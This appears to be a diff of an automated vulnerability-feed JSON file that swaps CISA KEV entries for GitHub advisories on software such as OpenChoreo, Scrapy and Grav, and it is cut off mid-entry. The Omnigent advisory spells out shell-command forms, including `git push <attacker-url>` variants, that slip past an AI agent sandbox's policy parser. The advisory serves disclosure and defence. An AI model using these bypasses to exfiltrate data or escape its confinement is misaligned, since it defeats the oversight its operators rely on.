@@ -1,143 +1,10 @@
 {
-  "generated": "2026-09-02T20:12:47.805443+00:00",
-  "total": 35,
-  "kev": 7,
-  "zero_day": 15,
+  "generated": "2026-09-03T01:47:58.092407+00:00",
+  "total": 44,
+  "kev": 0,
+  "zero_day": 16,
   "enriched": 0,
   "findings": [
-    {
-      "id": "CVE-2026-9586",
-      "title": "CVE-2026-9586 \u2014 Sangoma Switchvox SQL Injection Vulnerability",
-      "summary": "Vendor: Sangoma | Product: Switchvox. Sangoma Switchvox contains a SQL injection vulnerability which allows an unauthenticated remote attacker to execute arbitrary SQL statements against the backend PostgreSQL database using a single crafted request, including database operations and remote code execution. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-09-05)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-9586",
-      "published": "2026-09-02",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-9586"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-83549",
-      "title": "CVE-2026-83549 \u2014 SonicWall SMA1000 Appliances OS Command Injection Vulnerability",
-      "summary": "Vendor: SonicWall | Product: SMA1000 Appliances. SonicWall SMA1000 Appliances contains an OS command injection vulnerability that could enable a remote authenticated attacker as administrator to execute arbitrary OS commands, resulting in remote code execution. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-09-05)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-83549",
-      "published": "2026-09-02",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-83549"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-59822",
-      "title": "CVE-2026-59822 \u2014 BerriAI LiteLLM Improper Authentication Vulnerability",
-      "summary": "Vendor: BerriAI | Product: LiteLLM. BerriAI LiteLLM contains an improper authentication vulnerability in the MCP Streamable HTTP endpoint that could allow an unauthenticated attacker to establish an authenticated MCP session using an arbitrary Bearer token. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-09-16)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-59822",
-      "published": "2026-09-02",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-59822"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
-    {
-      "id": "CVE-2026-48710",
-      "title": "CVE-2026-48710 \u2014 Kludex Starlette HTTP Request/Response Smuggling Vulnerability",
-      "summary": "Vendor: Kludex | Product: Starlette. Kludex Starlette contains a HTTP request/response smuggling vulnerability that could allow attackers to inject paths into the host part, prepending the actual path leading to issues such as authentication bypass when the authentication depends on the reconstructed URL\u2019s path. This vulnerability could be chaned with CVE-2026-42271. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-09-16)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-48710",
-      "published": "2026-09-02",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-48710"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
-    {
-      "id": "CVE-2026-49869",
-      "title": "CVE-2026-49869 \u2014 Kestra OSS OS Command Injection Vulnerability",
-      "summary": "Vendor: Kestra | Product: Kestra OSS. Kestra OSS contains an OS command injection vulnerability that could allow an unauthenticated remote attacker to create and execute arbitrary workflows without credentials. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-09-05)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-49869",
-      "published": "2026-09-02",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-49869"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
-    {
-      "id": "CVE-2026-82329",
-      "title": "CVE-2026-82329 \u2014 JFrog Artifactory Improper Authentication Vulnerability",
-      "summary": "Vendor: JFrog | Product: Artifactory. JFrog Artifactory contains an improper authentication vulnerability that under default configuration can allow an unauthenticated attacker with network access to obtain administrative privileges.  Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-09-05)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-82329",
-      "published": "2026-09-02",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-82329"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
-    {
-      "id": "CVE-2026-83548",
-      "title": "CVE-2026-83548 \u2014 SonicWall SMA1000 Appliances Server-Side Request Forgery Vulnerability",
-      "summary": "Vendor: SonicWall | Product: SMA1000 Appliances. SonicWall SMA1000 Appliances contains a server-side request forgery vulnerability that could allow a remote unauthenticated attacker to gain unauthorized access to sensitive functionality and perform unauthorized operations. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-09-05)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-83548",
-      "published": "2026-09-02",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-83548"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-194a",
       "title": "Improve Router Hygiene to Protect Against Russian State-Sponsored Targeting",
@@ -362,6 +229,24 @@
       "is_high_severity": false
     },
     {
+      "id": "CVE-2026-61690",
+      "title": "Grav: Decompression Bomb via ZipArchiver - Missing Extraction Limits",
+      "summary": "## Summary\n`ZipArchiver::extract()` lacks limits on uncompressed size, file count, and nesting depth, creating a distinct, unpatched variant of the GHSA-2vcx-h8p2-9pg9 zip bomb vulnerability. While the parallel method Installer::unZip() received comprehensive limits, ZipArchiver::extract() remains unprotected, leaving a separate code path vulnerable to the same attack vector. The vulnerability is a distinct, unpatched variant of the bug described in GHSA-2vcx-h8p2-9pg9, as it affects a separate code path in the same codebase, implementing the same abstract class.\n\n---\n\n## Details\n\n**Vulnerable code** - `system/src/Grav/Common/Filesystem/ZipArchiver.php:29-58`:\n\n```php\npublic function extract($destination, ?callable $status = null)\n{\n    $zip = new ZipArchive();\n    $archive = $zip->open($this->archive_file);\n\n    if ($archive === true) {\n        Folder::create($destination);\n\n        // Only guards against Zip Slip (path traversal)\n        for ($i = 0, $count = $zip->count(); $i < $count; $i++) {\n            $name = $zip->getNameIndex($i);\n            if ($name !== false && !$this->isSafeEntryPath($name)) {\n                $zip->close();\n                throw new RuntimeException(...);\n            }\n        }\n\n        // Extracts EVERYTHING \u2014 no size, count, or depth limit\n        if (!$zip->extractTo($destination)) { ... }\n\n        $zip->close();\n        return $this;\n    }\n}\n```\n\n**What's missing vs `Installer::unZip()`**:\n\n| Protection | `Installer::unZip()` | `ZipArchiver::extract()` |\n|-----------|---------------------|------------------------|\n| Zip Slip guard | \u2705 | \u2705 |\n| Max uncompressed size | \u2705 (1 GiB) | \u274c |\n| Max file count | \u2705 (50000) | \u274c |\n| Max nesting depth | \u2705 (48) | \u274c |\n| Pre-extraction validation | \u2705 All entries validated first | \u274c Extracts immediately |\n\n**The fix applied to Installer** (GHSA-2vcx, `Installer.php:178-269`):\n\n```php\n// GHSA-2vcx-h8p2-9pg9: bound what extractTo() will write to disk.\n$limits = $this->archiveLimits();\n$size = $count = ",
+      "link": "https://github.com/advisories/GHSA-928x-9mpw-8h56",
+      "published": "2026-09-02T21:35:43Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-61690"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
       "id": "CVE-2026-16732",
       "title": "fastify vulnerable to X-Forwarded-* spoofing under trustProxy hop-count",
       "summary": "## Impact\n\nThe fix for [CVE-2026-3635](https://www.cve.org/CVERecord?id=CVE-2026-3635) ([GHSA-444r-cwp2-x5xf](https://github.com/fastify/fastify/security/advisories/GHSA-444r-cwp2-x5xf)) added a `proxyFn(socket.remoteAddress, 0)` guard on the `X-Forwarded-*` reads in `request.host`, `request.protocol`, `request.hostname`, `request.ip`, and `request.ips`. That guard closes the IP, CIDR, and custom-function forms of `trustProxy` correctly because those forms compile to predicates that inspect the connecting address. The hop-count form (`trustProxy: <number>`) compiles to a predicate that structurally ignores the address argument, so the guard reduces to `0 < tp`, always true for any `tp >= 1`.\n\nApplications configured with `trustProxy: <number>` (documented as \"behind N reverse proxies\", `trustProxy: 1` being the canonical single-proxy setting) remain vulnerable. An attacker who can reach the Fastify origin directly, bypassing the front-facing proxy, can spoof the request fields exactly as in the unpatched version. Impact class matches the parent CVE-2026-3635: host injection in generated URLs, HTTPS-enforcement bypass, secure-cookie / CSRF-origin bypass, host-based routing and cache poisoning.\n\n## Patches\n\nPatched in fastify 5.12.1. The numeric form of `trustProxy` is now disabled at runtime and removed from the TypeScript type union.\n\n## Workarounds\n\n- Migrate to an IP / CIDR / custom-function `trustProxy` value that validates the connecting address. Custom functions must inspect the `address` argument, not only the hop index.\n- Ensure the Fastify origin is only reachable through the trusted proxy chain (no direct network path).",
@@ -378,6 +263,276 @@
       ],
       "is_zero_day": true,
       "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-73667",
+      "title": "OpenChoreo: Authenticated OS command injection via OpenChoreo Workflow Plane templates enables code execution in privileged pods",
+      "summary": "### Summary\nOpenChoreo Workflow Plane templates were vulnerable to OS command injection because some developer-controlled workflow parameters were interpolated directly into shell program text executed through sh -c.\n\nAn authenticated user with permission to configure and trigger an affected workflow could supply crafted parameter values containing shell metacharacters. Because Argo substituted these values directly into the shell script before execution, the values could alter the script and execute arbitrary commands inside the workflow pod.\n\nIn affected configurations, some build and publish templates used privileged Podman containers without Kubernetes pod user-namespace isolation. Consequently, injected commands could run as UID 0 inside a privileged container, with UID 0 mapped into the host user namespace. This substantially increased the potential impact of the command-injection vulnerability.\n\nThe remediation ensures that workflow parameters are treated as data rather than executable shell syntax. Affected values are now passed through container.env and consumed as quoted shell variables. JSON-derived build environment variables and build arguments are passed as separate argument-vector entries instead of being reconstructed as whitespace-delimited shell strings.\n\n### Impact\nAn authenticated user with permission to trigger an affected workflow could execute arbitrary commands inside the corresponding workflow pod.\n\nDepending on the affected template and its configuration, an attacker could potentially:\n- Read source code checked out by the workflow.\n- Read Git credentials, registry credentials, or other secrets mounted into the pod.\n- Read the pod's Kubernetes service account token.\n- Access mounted volumes and other build-time data.\n- etc\n\nSome affected build and publish templates ran Podman using:\n\n```\nsecurityContext:\n  privileged: true\n```\n\nand did not previously enable pod user namespaces.\n\nWithout `hostUsers: false`, UID 0 inside the container is UID ",
+      "link": "https://github.com/advisories/GHSA-2mw5-23gm-pccq",
+      "published": "2026-09-02T23:45:26Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-73667"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-73840",
+      "title": "OpenChoreo: Unauthenticated build/workflow trigger via git-provider confusion (webhook signature bypass)",
+      "summary": "## Summary\nThe OpenChoreo autobuild webhook endpoint (`POST /api/v1alpha1/autobuild`) selected the git provider used to authenticate an incoming webhook from a client-supplied request header rather than from the target component's configuration, and its Bitbucket provider accepted requests without a valid signature. A caller could set the `X-Event-Key` header to be treated as a Bitbucket webhook, bypassing the HMAC secret that otherwise protects GitHub and GitLab webhooks, and trigger a component build without authenticating.\n\n## Impact\nAn attacker who can reach the autobuild webhook endpoint and knows the repository URL and branch configured for an auto-build component can trigger a build for that component without authenticating \u2014 including components configured for GitHub or GitLab, since the provider used or verification is chosen by the caller rather than by the component's configuration. The\ntriggered build runs against a commit SHA supplied by the attacker, and the component lookup is not scoped to a tenant or namespace, so any auto-build component across the cluster matching the given repository and branch is affected. This can result in unauthorized builds \u2014 and, where auto-deploy is configured, unauthorized deployment of attacker-influenced code \u2014 and can be used to exhaust build resources through repeated unauthenticated triggering.\n\nThe exposure applies to any component with `spec.autoBuild: true`, regardless of which git provider it declares, wherever the autobuild webhook endpoint is network-reachable.\n\n## Patches\nFixed in 1.0.3, 1.1.3, and 1.2.0-rc.2. The fix validates Bitbucket webhooks with HMAC-SHA256 against the configured secret using the same verification path as GitHub, requires a configured, non-empty secret for every provider (a missing secret now rejects the request instead of skipping validation), and requires the authenticated provider to match the git provider configured for the\nmatched component. Upgrading is non-disruptive \u2014 no componen",
+      "link": "https://github.com/advisories/GHSA-c5f6-2rm9-2w8g",
+      "published": "2026-09-02T23:45:14Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-73840"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-73841",
+      "title": "OpenChoreo: Cross-project command execution and wirelog view access via OpenChoreo openchoreo-api exec and wirelogs endpoints",
+      "summary": "### Summary\n\nThe OpenChoreo API server (`openchoreo-api`) authorized requests to its exec and wirelogs endpoints against the project supplied by the caller in the request, rather than against the project that actually owns the target component. The target component was resolved by name only, and the authorization engine decided purely from the caller-supplied resource hierarchy \u2014 the component's real owning project was never checked. As a result, an authenticated user who holds a project-scoped exec or log-viewing grant on any single project could run commands in, and read the wirelogs of, components owned by other projects in the same namespace.\n\n### Impact\n\nAn authenticated tenant holding a project-scoped `component:exec` grant on just one project can execute arbitrary commands \u2014 including an interactive shell \u2014 inside the running pods of components owned by any other project in the same namespace. This exposes those workloads' environment variables and mounted Secrets (such as database credentials, API keys, and tokens), allows tampering with the workload, and enables further pivoting using the workload's own network position and credentials. The same flaw in the wirelogs endpoint lets a project-scoped `wirelogs:view` grant read any component's wirelogs in the namespace.\n\nThe blast radius is every component in the namespace, reachable from a single legitimate project grant. The boundary crossed is project-within-namespace: the request still pins the namespace, so the issue does not cross namespace boundaries. In effect this is a cross-project (cross-team) remote command-execution and data-access primitive available to any low-privileged tenant.\n\n### Patches\n\nFixed in **1.2.3** and **1.1.6**. The fix aligns the exec and wirelogs endpoints with the pattern already used by other first-class component operations: the target component is fetched first and authorization is evaluated against its real owning project (`comp.Spec.Owner.ProjectName`) instead of the caller-s",
+      "link": "https://github.com/advisories/GHSA-52gf-6rpq-fgmx",
+      "published": "2026-09-02T23:44:51Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-73841"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-73843",
+      "title": "OpenChoreo: Unauthenticated access to data-plane operations via OpenChoreo cluster-gateway management APIs",
+      "summary": "### Summary\nThe OpenChoreo control-plane **cluster-gateway** served its caller-facing management APIs on the same network listener that accepts data-plane agent connections. In the multi-cluster topology that listener is published outside the cluster, and the management APIs did not authenticate the calling client. A party able to reach the listener could therefore invoke privileged data-plane operations without authenticating and without passing through the OpenChoreo API server's authorization.\n\n### Impact\nAn attacker who can reach the externally published cluster-gateway endpoint can perform data-plane operations normally restricted to the OpenChoreo API server and gated by its authorization \u2014 including proxying the data plane's Kubernetes API and executing commands inside workload pods. This can result in full compromise of workloads on the affected data plane (disclosure, tampering, and denial of service).\n\nThe exposure applies to the multi-cluster / remote data-plane topology, where the cluster-gateway is published outside the cluster so remote data-plane agents can connect. That same externally reachable listener also served the caller-facing management APIs, which did not authenticate the caller. Deployments that do not publish the cluster-gateway outside the cluster are not affected.\n\n### Patches\nFixed in **1.0.2**, **1.1.2**, and **1.2.0**. The fix moves the caller-facing management APIs onto a separate internal listener that is not published outside the cluster, leaving only the agent-connection endpoint on the externally reachable listener. Upgrading is non-disruptive \u2014 no data-plane agent or configuration changes are required beyond the standard chart upgrade. Upgrade path: 1.1.x \u2192 1.1.2, 1.0.x and earlier \u2192 1.0.2, 1.2 line \u2192 1.2.0.\n\n### Workarounds\nIf you cannot upgrade immediately:\n- If you do run remote data planes, restrict reachability of the external gateway endpoint to known data-plane source addresses only (firewall / gateway-level allowlisting)",
+      "link": "https://github.com/advisories/GHSA-qh9r-j7rp-4x2m",
+      "published": "2026-09-02T23:43:55Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-73843"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-72921",
+      "title": "SeaweedFS: Filer JWT allowed_prefixes literal prefix match allows cross-tenant access to sibling paths",
+      "summary": "### Impact\nWhen a filer JWT restricts a token to a set of path prefixes via `allowed_prefixes`, the authorization check used a literal byte-prefix match (`strings.HasPrefix`). A token scoped to `/tenant1` therefore also authorized requests to sibling paths such as `/tenant1234`, `/tenant1-old`, and `/tenant1backup`.\n\nIn a multi-tenant deployment this lets the holder of one tenant's token access another tenant's data. Because `allowed_prefixes` gates both read and write tokens, the impact covers cross-tenant reads and writes. A valid scoped token is required, so this is an authorization bypass rather than a fully unauthenticated flaw.\n\n### Affected component\n- `weed/server/filer_server_handlers.go` (JWT `allowed_prefixes` authorization check)\n\n### Patches\nFixed in **4.24**. The check now matches on `/`-separated path components after `path.Clean` normalisation, so `/tenant1` authorizes only `/tenant1` and its descendants \u2014 not `/tenant1234` or other sibling paths.\n\n### Workarounds\nWhere feasible, choose prefix names that are not string-prefixes of one another (e.g. keep a trailing separator convention). Upgrade to 4.24.\n\n### References\n- Reported by Kadir Arslan (https://github.com/KadirArslan)",
+      "link": "https://github.com/advisories/GHSA-gv5w-hfx8-8cwq",
+      "published": "2026-09-02T23:42:05Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-72921"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-84366",
+      "title": "Scrapy: S3DownloadHandler sends signed S3 requests over plaintext HTTP by default",
+      "summary": "### Problem\n\nScrapy\u2019s `S3DownloadHandler` sends signed S3 requests over plaintext HTTP by default.\n\nA normal request like `s3://bucket/key` is converted into `http://bucket.s3.amazonaws.com/key` unless `request.meta[\"is_secure\"]` is explicitly set. The generated request is then signed with configured AWS credentials, so AWS authorization material can be sent without TLS.\n\nVulnerable code in `scrapy/core/downloader/handlers/s3.py`:\n\n```python\nscheme = \"https\" if request.meta.get(\"is_secure\") else \"http\"\nurl = f\"{scheme}://{bucket}.s3.amazonaws.com{path}\"\n```\n\nThe request is then signed and dispatched:\n\n```python\nself._signer.add_auth(awsrequest)\nrequest = request.replace(url=url, headers=awsrequest.headers.items())\n```\n\n### Impact\n\nUsers making Scrapy `s3://` requests with AWS credentials are impacted.\n\nA network attacker able to observe traffic between Scrapy and S3, such as a public Wi-Fi attacker, compromised router, ISP/corporate network observer, or local network attacker using ARP spoofing, can read:\n\n```text\nbucket/key path\nAWS Authorization header\nX-Amz-Security-Token, if temporary credentials are used\nS3 object contents\nS3 response headers\n```\n\nAn active MITM attacker can also modify the plaintext S3 response body, status code, and headers before Scrapy processes it. This can cause scraped data poisoning, poisoned exports, HTTP cache poisoning when cache is enabled, and influence over later crawl targets through forged redirects or attacker-controlled links.\n\n\nSuggested classification: **CWE-319: Cleartext Transmission of Sensitive Information**.\n\n\n### PoC\n\nA minimal PoC creates an `s3://` request, enables fake AWS settings, captures the request produced by `S3DownloadHandler`, and prints the rewritten URL and auth headers.",
+      "link": "https://github.com/advisories/GHSA-76g3-c3x4-crvx",
+      "published": "2026-09-02T22:50:44Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-84366"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-62676",
+      "title": "Omnigent Guardrail policy bypass: shell-command parser fails open in policies/builtins/_shell.py",
+      "summary": "**Reporter:** Aaron / Aeon \u2014 autonomous security agent (https://github.com/aaronjmars/aeon)\n**Project:** `omnigent-ai/omnigent` v0.1.0 (Databricks) \u2014 meta-harness running Claude Code / Codex / Pi \"in check with policies and sandboxing\"\n**Component:** `omnigent/policies/builtins/_shell.py` (shared parser) \u2192 consumed by `policies/builtins/github.py` (`write_repos`/`write_branches` allowlist) and `policies/builtins/working_dir.py` (workspace confinement)\n\n## Summary\n\nThe shared shell-command parser **fails open**. When a gated command spells something the parser doesn't recognize, it produces no operation, the policy evaluator returns `None`, and `None` = abstain = **ALLOW**. So any command the parser misses bypasses both the GitHub repo/branch allowlist and the working-directory confinement \u2014 the product's two core safety guarantees.\n\n## Impact\n\nA misaligned or prompt-injected agent that is *meant to be confined* can:\n\n- `git push` to an attacker-controlled repo (code / secret exfiltration),\n- push to a protected branch,\n- escape its workspace via `git worktree add` / `git -C <other-dir>`.\n\n## Bypass classes (all verified against the real policy code)\n\n- **Combined interpreter flags:** `bash -lc \"git push <attacker-url>\"`\n- **Unlisted wrappers:** `timeout` / `nice` / `setsid` / `stdbuf \u2026 git push \u2026`\n- **Command substitution:** `x=$(git push <attacker-url>)`\n- **Un-split background operator:** `true & git push <attacker-url>`\n\nControls that **correctly hold** (confirming this is parser incompleteness, not an allowlist logic error): bare `git push <attacker-url>` and `env git push \u2026` both **DENY**.\n\n## Suggested fix\n\nMake the gated surface **fail closed**:\n\n1. An unrecognized gated command must **DENY**, not return `None` \u2192 ALLOW. Abstain on a security gate should resolve to deny, not allow.\n2. Canonicalize known wrappers (`timeout` / `nice` / `setsid` / `stdbuf` / `env`) down to their inner command before evaluation.\n3. Recurse into `sh -c` / `bash -c` payloads and com",
+      "link": "https://github.com/advisories/GHSA-7mqg-cx4g-x2rf",
+      "published": "2026-09-02T22:40:07Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-62676"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-65842",
+      "title": "Plate: SSRF with response disclosure in DOCX image embedding",
+      "summary": "## Summary\n\n`@platejs/docx-io` can fetch remote image URLs while converting HTML to DOCX. When an application converts attacker-controlled HTML in a server-side or privileged environment, this can cause the application environment to make unintended outbound requests and include fetched image data in the generated DOCX.\n\n## Impact\n\nApplications are affected when they use `@platejs/docx-io` to convert untrusted HTML that may contain remote image references, especially in server-side conversion workflows or environments with access to internal network resources.\n\nAffected package:\n\n- `@platejs/docx-io` versions `< 53.3.2`\n\n## Patched versions\n\nUpgrade to `@platejs/docx-io` version `53.3.2` or later.\n\n## Workarounds\n\nIf you cannot upgrade immediately, do not pass untrusted HTML with remote image URLs to DOCX export. Sanitize untrusted HTML to remove remote image references, convert trusted images to data URIs before conversion, or run conversion in an environment with restricted outbound network access.\n\n## Credits\n\nThanks to EQSTLab for reporting this issue.",
+      "link": "https://github.com/advisories/GHSA-4q39-2jhr-7qx8",
+      "published": "2026-09-02T22:14:54Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-65842"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-63481",
+      "title": "Hurl: Cookies in Cookies section leak when redirecting to a different host",
+      "summary": "## The Bug\n\nHurl <= 8.0.1 lets you define cookies two ways in a .hurl file:\n\n1. As a raw Cookie: header in the [Header]/headers area\n2. In a dedicated [Cookies] section (parsed into RequestSpec.cookies)\n\nWhen following a redirect to a different host, Hurl correctly strips security-sensitive data (Authorization, Cookie header, and basic-auth user) to avoid leaking credentials cross-host \u2014 mirroring libcurl's default behavior. But it only stripped the cookie that came in as a header. Cookies declared in the [Cookies] section were carried over to the new host unchanged \u2014 a credential-leak bug. \n\nHurl file that leaks cookies:\n\n```hurl\nGET http://localhost:8000/follow-redirect-basic-auth?change_host=true\n[Cookies]\nfruit: lemon\nHTTP 200\n```\n\nHurl file that doesn't leak cookie:\n\n```hurl\nGET http://localhost:8000/follow-redirect-basic-auth?change_host=true\nCookie: fruit=lemon\nHTTP 200\n```\n\n## Patch\n\nWith Hurl <= 8.0.1, user can use `Cookie` header instead of the dedicated `[Cookies]` section.",
+      "link": "https://github.com/advisories/GHSA-7w2g-9mf9-324m",
+      "published": "2026-09-02T22:11:11Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-63481"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-63435",
+      "title": "Mail: Email address spoofing via malformed RFC 2047 encoded-words",
+      "summary": "## Summary\n\nMail::Utilities.q_value_decode and Mail::Utilities.b_value_decode decoded only the first RFC 2047 encoded-word in a string and used an overly greedy pattern to match the charset token. A crafted, malformed encoded-word embedded in an address display name or local part could cause the decoded output to differ from what a human reviewer or downstream parser would expect, allowing an attacker to spoof the apparent sender/recipient address.\n\n## Details\n\nBoth decoders used a single String#match against a pattern such as /\\=\\?(.+)?\\?[Qq]\\?(.*)\\?\\=/m. Two problems:\n\n1. Single match, dropped remainder. Only the first =?charset?Q?...?= (or ?B?) word was decoded. Any additional encoded-words or surrounding text were not handled consistently, so the decoded result could silently omit or alter parts of the input.\n2. Greedy charset capture. (.+)? is greedy and matches across ? delimiters, so a malformed word could span more of the string than a strict RFC 2047 parse would, changing the boundary between \"encoded\" and \"literal\" text.\n\n## Impact\n\nApplications using mail to parse and display or authorize based on decoded header values (From, To, Reply-To, etc.) may present or act on an address different from the one a validator inspecting the raw header would see. Primary risk is spoofing / phishing and authorization-check bypass. No RCE.",
+      "link": "https://github.com/advisories/GHSA-mvxr-6m87-mv2q",
+      "published": "2026-09-02T22:02:32Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-63435"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-62669",
+      "title": "Grav: 2FA Bypass via 'login.regenerate2FASecret' - Secret Rotation During Pending Challenge",
